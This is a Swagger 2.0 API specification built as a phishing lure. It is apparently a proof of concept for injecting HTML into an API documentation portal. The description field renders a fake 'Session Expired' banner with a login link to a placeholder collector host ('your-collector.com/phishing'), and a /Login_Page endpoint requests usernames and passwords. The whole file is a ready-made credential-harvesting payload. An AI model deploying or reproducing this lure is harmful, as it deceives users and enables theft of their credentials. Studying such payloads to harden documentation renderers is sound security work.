swagger: '2.0'
info:
  version: 1.0.0
  title: 🔒 Secure API Portal - Authentication Required
  description: |
    <h1>🔐 Session Expired</h1>
    <p>Your session has expired due to inactivity.</p>
    <p>Please re-authenticate to continue accessing the API documentation.</p>
    <p>
      <a href="https://your-collector.com/phishing?redirect=">Click here to login</a>
    </p>
    <hr>
    <p>API Documentation Portal - Login to continue services</p>

paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to log in.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: Successfully logged in and authenticated.
        '400':
          description: Invalid credentials or missing parameters.
        '500':
          description: Internal server error.
